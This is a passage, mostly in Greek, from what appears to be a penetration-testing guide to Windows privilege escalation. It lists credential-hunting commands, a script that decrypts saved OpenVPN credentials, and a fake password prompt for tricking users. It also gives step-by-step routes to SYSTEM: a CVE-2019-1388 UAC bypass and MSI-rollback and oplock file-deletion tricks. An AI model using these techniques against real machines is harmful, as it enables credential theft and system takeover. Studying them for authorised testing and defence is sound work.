> Φαίνεται ότι αυτή η technique δεν είναι πλέον έγκυρη. Προσπάθησα να δημιουργήσω κάποια ssh keys, να τα προσθέσω με `ssh-add` και να κάνω login via ssh σε ένα machine. Το registry HKCU\Software\OpenSSH\Agent\Keys δεν υπάρχει και το procmon δεν εντόπισε τη χρήση του `dpapi.dll` κατά το asymmetric key authentication.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Μπορείτε επίσης να αναζητήσετε αυτά τα αρχεία χρησιμοποιώντας **metasploit**: _post/windows/gather/enum_unattend_

Example content:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Αντίγραφα SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Διαπιστευτήρια Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Αναζήτησε ένα αρχείο με όνομα **SiteList.xml**

### Cached GPP Pasword

Μια δυνατότητα ήταν παλαιότερα διαθέσιμη που επέτρεπε την ανάπτυξη custom τοπικών λογαριασμών διαχειριστή σε μια ομάδα μηχανών μέσω Group Policy Preferences (GPP). Ωστόσο, αυτή η μέθοδος είχε σημαντικά security flaws. Πρώτον, τα Group Policy Objects (GPOs), αποθηκευμένα ως XML files στο SYSVOL, μπορούσαν να προσπελαστούν από οποιονδήποτε domain user. Δεύτερον, τα passwords μέσα σε αυτά τα GPPs, κρυπτογραφημένα με AES256 χρησιμοποιώντας ένα publicly documented default key, μπορούσαν να αποκρυπτογραφηθούν από οποιονδήποτε authenticated user. Αυτό δημιουργούσε σοβαρό κίνδυνο, καθώς θα μπορούσε να επιτρέψει στους users να αποκτήσουν elevated privileges.

Για να μετριαστεί αυτός ο κίνδυνος, αναπτύχθηκε μια function για σάρωση locally cached GPP files που περιέχουν ένα πεδίο "cpassword" το οποίο δεν είναι κενό. Μόλις βρεθεί ένα τέτοιο αρχείο, η function αποκρυπτογραφεί το password και επιστρέφει ένα custom PowerShell object. Αυτό το object περιλαμβάνει λεπτομέρειες σχετικά με το GPP και τη θέση του αρχείου, βοηθώντας στην αναγνώριση και διόρθωση αυτής της security vulnerability.

Αναζήτησε στο `C:\ProgramData\Microsoft\Group Policy\history` ή στο _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (πριν από το W Vista)_ αυτά τα αρχεία:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Για να αποκρυπτογραφήσεις το cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Χρήση του crackmapexec για την απόκτηση των κωδικών πρόσβασης:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Παράδειγμα του web.config με credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Διαπιστευτήρια OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Ζητήστε credentials

Μπορείτε πάντα να **ζητήσετε από τον χρήστη να εισαγάγει τα credentials του ή ακόμη και τα credentials ενός διαφορετικού χρήστη** αν νομίζετε ότι μπορεί να τα γνωρίζει (προσέξτε ότι το να **ζητάτε** απευθείας από τον client τα **credentials** είναι πραγματικά **επικίνδυνο**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Πιθανά filenames που περιέχουν credentials**

Γνωστά files που κάποτε περιείχαν **passwords** σε **clear-text** ή **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Search όλων των προτεινόμενων αρχείων:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Διαπιστευτήρια στον RecycleBin

Θα πρέπει επίσης να ελέγξετε το Bin για να αναζητήσετε διαπιστευτήρια μέσα σε αυτό

Για να **ανακτήσετε passwords** που έχουν αποθηκευτεί από διάφορα προγράμματα μπορείτε να χρησιμοποιήσετε: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Μέσα στο registry

**Άλλα πιθανά registry keys με διαπιστευτήρια**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Εξαγωγή openssh keys από το registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Ιστορικό Browsers

Θα πρέπει να ελέγξεις για dbs όπου αποθηκεύονται passwords από **Chrome ή Firefox**.\
Επίσης έλεγξε το history, τα bookmarks και τα favourites των browsers, ώστε ίσως κάποια **passwords are** να είναι αποθηκευμένα εκεί.

Tools για να εξαγάγεις passwords από browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** είναι μια τεχνολογία ενσωματωμένη στο λειτουργικό σύστημα Windows που επιτρέπει **intercommunication** μεταξύ software components διαφορετικών languages. Κάθε COM component προσδιορίζεται μέσω ενός class ID (CLSID) και κάθε component εκθέτει functionality μέσω ενός ή περισσότερων interfaces, τα οποία προσδιορίζονται μέσω interface IDs (IIDs).

Οι COM classes και interfaces ορίζονται στο registry κάτω από **HKEY\CLASSES\ROOT\CLSID** και **HKEY\CLASSES\ROOT\Interface** αντίστοιχα. Αυτό το registry δημιουργείται με συγχώνευση των **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Μέσα στα CLSIDs αυτού του registry μπορείς να βρεις το child registry **InProcServer32** το οποίο περιέχει μια **default value** που δείχνει σε μια **DLL** και μια τιμή που ονομάζεται **ThreadingModel** η οποία μπορεί να είναι **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) ή **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Βασικά, αν μπορείς να **overwrite any of the DLLs** που πρόκειται να εκτελεστούν, θα μπορούσες να **escalate privileges** αν αυτή η DLL πρόκειται να εκτελεστεί από διαφορετικό χρήστη.

Για να μάθεις πώς οι attackers χρησιμοποιούν το COM Hijacking ως μηχανισμό persistence έλεγξε:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Γενική αναζήτηση Password σε αρχεία και registry**

**Αναζήτηση στο περιεχόμενο αρχείων**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Αναζήτηση ενός αρχείου με συγκεκριμένο όνομα**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Αναζήτησε στο registry για ονόματα κλειδιών και passwords**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Εργαλεία που αναζητούν passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatically search for all the files containing passwords mentioned in this page.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is another great tool to extract password from a system.

The tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) search for **sessions**, **usernames** and **passwords** of several tools that save this data in clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Φανταστείτε ότι **μια διεργασία που τρέχει ως SYSTEM ανοίγει μια νέα διεργασία** (`OpenProcess()`) με **full access**. Η ίδια διεργασία **επίσης δημιουργεί μια νέα διεργασία** (`CreateProcess()`) **με low privileges αλλά κληρονομώντας όλα τα open handles της κύριας διεργασίας**.\
Τότε, αν έχετε **full access στη low privileged διεργασία**, μπορείτε να αρπάξετε το **open handle προς την privileged process που δημιουργήθηκε** με `OpenProcess()` και να **inject a shellcode**.\
[Διαβάστε αυτό το παράδειγμα για περισσότερες πληροφορίες σχετικά με **το πώς να εντοπίσετε και να εκμεταλλευτείτε αυτήν την ευπάθεια**.](leaked-handle-exploitation.md)\
[Διαβάστε αυτήν την **άλλη δημοσίευση για μια πιο ολοκληρωμένη εξήγηση σχετικά με το πώς να δοκιμάσετε και να καταχραστείτε περισσότερα open handlers διεργασιών και threads που κληρονομούνται με διαφορετικά επίπεδα permissions (όχι μόνο full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Τα shared memory segments, γνωστά ως **pipes**, επιτρέπουν επικοινωνία διεργασιών και μεταφορά δεδομένων.

Τα Windows παρέχουν μια δυνατότητα που ονομάζεται **Named Pipes**, επιτρέποντας σε άσχετες διεργασίες να μοιράζονται δεδομένα, ακόμα και σε διαφορετικά δίκτυα. Αυτό μοιάζει με αρχιτεκτονική client/server, με ρόλους ορισμένους ως **named pipe server** και **named pipe client**.

Όταν δεδομένα στέλνονται μέσω ενός pipe από έναν **client**, ο **server** που έστησε το pipe έχει τη δυνατότητα να **υιοθετήσει την ταυτότητα** του **client**, εφόσον διαθέτει τα απαραίτητα δικαιώματα **SeImpersonate**. Ο εντοπισμός μιας **privileged process** που επικοινωνεί μέσω ενός pipe που μπορείτε να μιμηθείτε δίνει μια ευκαιρία να **αποκτήσετε υψηλότερα privileges** υιοθετώντας την ταυτότητα αυτής της διεργασίας μόλις αλληλεπιδράσει με το pipe που δημιουργήσατε. Για οδηγίες σχετικά με την εκτέλεση μιας τέτοιας επίθεσης, χρήσιμοι οδηγοί βρίσκονται [**εδώ**](named-pipe-client-impersonation.md) και [**εδώ**](#from-high-integrity-to-system).

Επίσης το ακόλουθο εργαλείο επιτρέπει να **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **και αυτό το εργαλείο επιτρέπει να παραθέσετε και να δείτε όλα τα pipes για να βρείτε privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Η υπηρεσία Telephony (TapiSrv) σε server mode εκθέτει `\\pipe\\tapsrv` (MS-TRP). Ένας απομακρυσμένος authenticated client μπορεί να καταχραστεί τη διαδρομή async event που βασίζεται σε mailslot για να μετατρέψει το `ClientAttach` σε αυθαίρετο **4-byte write** σε οποιοδήποτε υπάρχον αρχείο στο οποίο μπορεί να γράψει το `NETWORK SERVICE`, και στη συνέχεια να αποκτήσει δικαιώματα Telephony admin και να φορτώσει ένα αυθαίρετο DLL ως η υπηρεσία. Πλήρης ροή:

- `ClientAttach` με `pszDomainUser` ρυθμισμένο σε μια writable υπάρχουσα διαδρομή → η υπηρεσία το ανοίγει μέσω `CreateFileW(..., OPEN_EXISTING)` και το χρησιμοποιεί για async event writes.
- Κάθε event γράφει το attacker-controlled `InitContext` από το `Initialize` σε εκείνο το handle. Καταχωρίστε ένα line app με `LRegisterRequestRecipient` (`Req_Func 61`), ενεργοποιήστε `TRequestMakeCall` (`Req_Func 121`), ανακτήστε μέσω `GetAsyncEvents` (`Req_Func 0`), και μετά κάντε unregister/shutdown για να επαναλάβετε deterministic writes.
- Προσθέστε τον εαυτό σας στο `[TapiAdministrators]` στο `C:\Windows\TAPI\tsec.ini`, επανασυνδεθείτε, και μετά καλέστε `GetUIDllName` με μια αυθαίρετη διαδρομή DLL για να εκτελέσετε το `TSPI_providerUIIdentify` ως `NETWORK SERVICE`.

Περισσότερες λεπτομέρειες:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Δείτε τη σελίδα **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Τα clickable Markdown links που προωθούνται στο `ShellExecuteExW` μπορούν να ενεργοποιήσουν επικίνδυνους URI handlers (`file:`, `ms-appinstaller:` ή οποιοδήποτε registered scheme) και να εκτελέσουν αρχεία που ελέγχει ο attacker ως ο τρέχων χρήστης. Δείτε:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Όταν αποκτάτε ένα shell ως χρήστης, μπορεί να υπάρχουν scheduled tasks ή άλλες διεργασίες που εκτελούνται και **περνούν credentials στη command line**. Το script παρακάτω καταγράφει τις command lines διεργασιών κάθε δύο δευτερόλεπτα και συγκρίνει την τρέχουσα κατάσταση με την προηγούμενη, εμφανίζοντας οποιεσδήποτε διαφορές.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Κλοπή κωδικών πρόσβασης από διεργασίες

## Από Low Priv User σε NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Αν έχεις πρόσβαση στο γραφικό περιβάλλον (μέσω console ή RDP) και το UAC είναι ενεργοποιημένο, σε ορισμένες εκδόσεις των Microsoft Windows είναι δυνατό να εκτελέσεις ένα terminal ή οποιαδήποτε άλλη διεργασία ως "NT\AUTHORITY SYSTEM" από έναν μη προνομιούχο χρήστη.

Αυτό καθιστά δυνατό το privilege escalation και το bypass του UAC ταυτόχρονα με την ίδια ευπάθεια. Επιπλέον, δεν υπάρχει ανάγκη να εγκαταστήσεις τίποτα και το binary που χρησιμοποιείται κατά τη διαδικασία είναι υπογεγραμμένο και εκδοθέν από τη Microsoft.

Μερικά από τα επηρεαζόμενα συστήματα είναι τα ακόλουθα:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Για να εκμεταλλευτείς αυτήν την ευπάθεια, είναι απαραίτητο να εκτελέσεις τα ακόλουθα βήματα:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

Η τεχνική που περιγράφεται [**σε αυτό το blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) με exploit code [**διαθέσιμο εδώ**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Η επίθεση βασικά συνίσταται στην κατάχρηση του rollback feature του Windows Installer για την αντικατάσταση νόμιμων αρχείων με κακόβουλα κατά τη διάρκεια της διαδικασίας uninstallation. Για αυτό ο attacker πρέπει να δημιουργήσει ένα **malicious MSI installer** που θα χρησιμοποιηθεί για να hijack το `C:\Config.Msi` folder, το οποίο αργότερα θα χρησιμοποιηθεί από το Windows Installer για να αποθηκεύσει rollback files κατά τη διάρκεια του uninstallation άλλων MSI packages, όπου τα rollback files θα έχουν τροποποιηθεί ώστε να περιέχουν το malicious payload.

Η συνοψισμένη τεχνική είναι η εξής:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Δημιούργησε ένα `.msi` που εγκαθιστά ένα harmless file (π.χ. `dummy.txt`) σε έναν writable folder (`TARGETDIR`).
- Σήμανε τον installer ως **"UAC Compliant"**, ώστε ένας **non-admin user** να μπορεί να τον εκτελέσει.
- Κράτα ένα ανοιχτό **handle** στο αρχείο μετά την εγκατάσταση.

- Step 2: Begin Uninstall
- Κάνε uninstall το ίδιο `.msi`.
- Η διαδικασία uninstall αρχίζει να μετακινεί αρχεία στο `C:\Config.Msi` και να τα μετονομάζει σε `.rbf` files (rollback backups).
- **Poll the open file handle** χρησιμοποιώντας `GetFinalPathNameByHandle` για να εντοπίσεις πότε το αρχείο γίνεται `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- Το `.msi` περιλαμβάνει ένα **custom uninstall action (`SyncOnRbfWritten`)** που:
- Σηματοδοτεί όταν το `.rbf` έχει γραφτεί.
- Έπειτα **περιμένει** σε ένα άλλο event πριν συνεχίσει το uninstall.

- Step 4: Block Deletion of `.rbf`
- Όταν δοθεί σήμα, άνοιξε το `.rbf` file χωρίς `FILE_SHARE_DELETE` — αυτό **αποτρέπει** τη διαγραφή του.
- Έπειτα **σήμανε πίσω** ώστε το uninstall να μπορέσει να ολοκληρωθεί.
- Το Windows Installer αποτυγχάνει να διαγράψει το `.rbf`, και επειδή δεν μπορεί να διαγράψει όλα τα περιεχόμενα, το **`C:\Config.Msi` δεν αφαιρείται**.

- Step 5: Manually Delete `.rbf`
- Εσύ (attacker) διαγράφεις το `.rbf` file χειροκίνητα.
- Τώρα το **`C:\Config.Msi` είναι άδειο**, έτοιμο να hijacked.

> Σε αυτό το σημείο, **trigger the SYSTEM-level arbitrary folder delete vulnerability** για να διαγραφεί το `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Δημιούργησε ξανά το `C:\Config.Msi` folder μόνος σου.
- Όρισε **weak DACLs** (π.χ. Everyone:F), και **κράτα ανοιχτό ένα handle** με `WRITE_DAC`.

- Step 7: Run Another Install
- Εγκατάστησε ξανά το `.msi`, με:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- Αυτή η εγκατάσταση θα χρησιμοποιηθεί για να trigger **rollback** ξανά, το οποίο διαβάζει `.rbs` και `.rbf`.

- Step 8: Monitor for `.rbs`
- Χρησιμοποίησε `ReadDirectoryChangesW` για να παρακολουθείς το `C:\Config.Msi` μέχρι να εμφανιστεί ένα νέο `.rbs`.
- Κατέγραψε το filename του.

- Step 9: Sync Before Rollback
- Το `.msi` περιέχει ένα **custom install action (`SyncBeforeRollback`)** που:
- Σηματοδοτεί ένα event όταν δημιουργηθεί το `.rbs`.
- Έπειτα **περιμένει** πριν συνεχίσει.

- Step 10: Reapply Weak ACL
- Αφού λάβεις το event `rbs created`:
- Το Windows Installer **επαναφέρει ισχυρά ACLs** στο `C:\Config.Msi`.
- Αλλά αφού εξακολουθείς να έχεις ένα handle με `WRITE_DAC`, μπορείς να **επαναφέρεις weak ACLs** ξανά.

> Τα ACLs **επιβάλλονται μόνο στο handle open**, οπότε μπορείς ακόμα να γράψεις στο folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Αντικατάστησε το `.rbs` file με ένα **fake rollback script** που λέει στο Windows να:
- Επαναφέρει το `.rbf` file σου (malicious DLL) σε ένα **privileged location** (π.χ. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Ρίξει το fake `.rbf` σου που περιέχει ένα **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Σήμανε το sync event ώστε ο installer να συνεχίσει.
- Ένα **type 19 custom action (`ErrorOut`)** έχει ρυθμιστεί να **αποτύχει σκόπιμα την εγκατάσταση** σε ένα γνωστό σημείο.
- Αυτό προκαλεί την έναρξη του **rollback**.

- Step 13: SYSTEM Installs Your DLL
- Το Windows Installer:
- Διαβάζει το malicious `.rbs` σου.
- Αντιγράφει το `.rbf` DLL σου στο target location.
- Τώρα έχεις το **malicious DLL σου σε έναν SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Τρέξε ένα trusted **auto-elevated binary** (π.χ. `osk.exe`) που φορτώνει το DLL που hijacked.
- **Boom**: Ο κώδικάς σου εκτελείται **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Η βασική τεχνική MSI rollback (η προηγούμενη) υποθέτει ότι μπορείς να διαγράψεις ένα **ολόκληρο folder** (π.χ. `C:\Config.Msi`). Αλλά τι γίνεται αν το vulnerability σου επιτρέπει μόνο **arbitrary file deletion** ?

Θα μπορούσες να εκμεταλλευτείς τα **NTFS internals**: κάθε folder έχει ένα κρυφό alternate data stream που ονομάζεται:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Αυτό το stream αποθηκεύει τα **index metadata** του φακέλου.

Άρα, αν **διαγράψεις το `::$INDEX_ALLOCATION` stream** ενός φακέλου, το NTFS **αφαιρεί ολόκληρο τον φάκελο** από το filesystem.

Μπορείς να το κάνεις αυτό χρησιμοποιώντας standard file deletion APIs όπως:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Παρόλο που καλείς ένα API διαγραφής *αρχείου*, αυτό **διαγράφει το ίδιο το folder**.

### Από Διαγραφή Περιεχομένων Folder σε SYSTEM EoP
Τι γίνεται αν το primitive σου δεν επιτρέπει να διαγράψεις αυθαίρετα files/folders, αλλά **επιτρέπει τη διαγραφή του περιεχομένου ενός folder που ελέγχει ο attacker**;

1. Step 1: Setup ένα bait folder και file
- Create: `C:\temp\folder1`
- Μέσα του: `C:\temp\folder1\file1.txt`

2. Step 2: Τοποθέτησε ένα **oplock** στο `file1.txt`
- Το oplock **παγώνει την εκτέλεση** όταν ένα privileged process προσπαθεί να διαγράψει το `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Βήμα 3: Ενεργοποίησε SYSTEM process (π.χ., `SilentCleanup`)
- Αυτή η διεργασία σαρώνει φακέλους (π.χ., `%TEMP%`) και προσπαθεί να διαγράψει το περιεχόμενό τους.
- Όταν φτάσει στο `file1.txt`, το **oplock triggers** και δίνει τον έλεγχο στο callback σου.

4. Βήμα 4: Μέσα στο oplock callback – ανακατεύθυνε τη διαγραφή

- Επιλογή A: Μετακίνησε το `file1.txt` αλλού
- Αυτό αδειάζει το `folder1` χωρίς να σπάσει το oplock.
- Μην διαγράψεις το `file1.txt` απευθείας — αυτό θα απελευθέρωνε το oplock πρόωρα.

- Επιλογή B: Μετέτρεψε το `folder1` σε ένα **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Επιλογή C: Δημιουργήστε ένα **symlink** στο `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Αυτό στοχεύει το εσωτερικό stream του NTFS που αποθηκεύει τα metadata του folder — αν το διαγράψεις, διαγράφεται το folder.

5. Step 5: Release the oplock
